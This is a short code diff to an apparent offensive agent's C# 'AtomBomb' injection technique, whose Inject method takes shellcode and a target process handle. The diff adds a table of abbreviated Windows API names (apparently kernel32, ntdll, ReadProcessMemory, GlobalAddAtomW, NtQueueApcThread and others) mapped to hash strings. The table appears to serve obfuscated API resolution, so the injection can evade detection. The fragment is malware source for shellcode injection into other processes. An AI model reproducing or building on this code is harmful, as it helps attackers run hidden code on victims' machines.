@@ -13,6 +13,18 @@ namespace Agent
     public class AtomBomb : ITechnique
     {
         int ITechnique.id => 3;
+        Dictionary<string, string> map = new Dictionary<string, string>()
+        {
+            { "k32", "A63CBAF3BECF39638EEBC81A422A5D00" },
+            { "ntd", "532FBE7D503E25FEDC8544721B744E16" },
+            { "ot", "0F64BB1E3663602915D1704D11CECFBB" },
+            { "vqe", "20A57E6DC41F83A8E6165946FC24028B" },
+            { "rpm", "D6A7D8802A1A96B0F330022B9C68DFC7" },
+            { "gpa", "96D9BE88669FB6C925C85443F50CC504" },
+            { "gaaw", "6F909A718BF5B419169EA47B7FE43261" },
+            { "nqat", "67D69EC328C646633596BF39046FE76D" },
+            { "nqua", "6F98ACAE82A620484CEE2E63A19DF0BC" },
+        };
 
         bool ITechnique.Inject(byte[] shellcode, nint hTarget)
         {
